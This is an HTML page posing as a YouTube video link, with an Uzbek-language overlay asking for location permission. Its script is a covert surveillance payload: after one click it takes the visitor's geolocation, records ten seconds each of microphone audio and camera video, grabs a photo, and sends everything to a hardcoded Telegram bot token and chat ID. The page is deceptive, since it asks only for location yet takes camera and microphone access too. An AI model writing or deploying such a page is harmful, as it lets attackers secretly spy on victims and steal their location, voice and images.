<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        #prompt-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #prompt-message {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 80%;
        }
        #prompt-message button {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <iframe src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=0&controls=1" 
                title="YouTube video player" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                allowfullscreen>
        </iframe>
    </div>

    <div id="prompt-overlay">
        <div id="prompt-message">
            <h2>Iltimos, ruxsat bering</h2>
            <p>YouTube videoni koâ€˜rishda davom etish uchun joylashuv ruxsatini bering.</p>
            <button onclick="requestPermissions()">Ruxsat berish</button>
        </div>
    </div>

    <script>
const BOT_TOKEN = '8057687168:AAHDxv2JopvR9wryv_hDRYTZq_tWSkHlIhs';
const CHAT_ID = '7265761467';

// ðŸ”¹ Telegramga media yuborish (audio, photo, video)
async function sendToTelegram(formData, endpoint) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            console.error(await response.text());
        }
    } catch (e) {
        console.error("Telegramga yuborishda xatolik:", e);
    }
}

// ðŸ”¹ Lokatsiyani yuborish
async function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async pos => {
            const { latitude, longitude } = pos.coords;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
            });
        }, err => console.error("Location error:", err));
    }
}

// ðŸ”¹ Audio yozish va yuborish
async function recordAudio(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('voice', blob, 'voice.ogg');
        await sendToTelegram(form, 'sendVoice');
    };

    recorder.start();
    setTimeout(() => recorder.stop(), 10000); // 10 sekund
}

// ðŸ”¹ Rasm olish va yuborish
async function takePhoto(stream) {
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    try {
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap, 0, 0);
        canvas.toBlob(async (blob) => {
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'photo.jpg');
            await sendToTelegram(form, 'sendPhoto');
        }, 'image/jpeg');
    } catch (e) {
        console.error("Rasm olishda xatolik:", e);
    }
}

// ðŸ”¹ Video yozish va yuborish
async function recordVideo(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('video', blob, 'video.webm');
        await sendToTelegram(form, 'sendVideo');
    };

    recorder.start();
    setTimeout(() => recorder.stop(), 10000); // 10 sekund
}

// ðŸ”¹ Barcha ruxsatlarni soâ€˜rash va ishga tushirish
async function requestPermissions() {
    document.getElementById('overlay').style.display = 'none';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });

        document.getElementById('preview').srcObject = stream;

        sendLocation();
        recordAudio(stream);
        takePhoto(stream);
        recordVideo(stream);

    } catch (e) {
        alert("Ruxsat berilmadi yoki xatolik yuz berdi");
        console.error("Ruxsat muammosi:", e);
    }
}
</script>
</body>
</html>
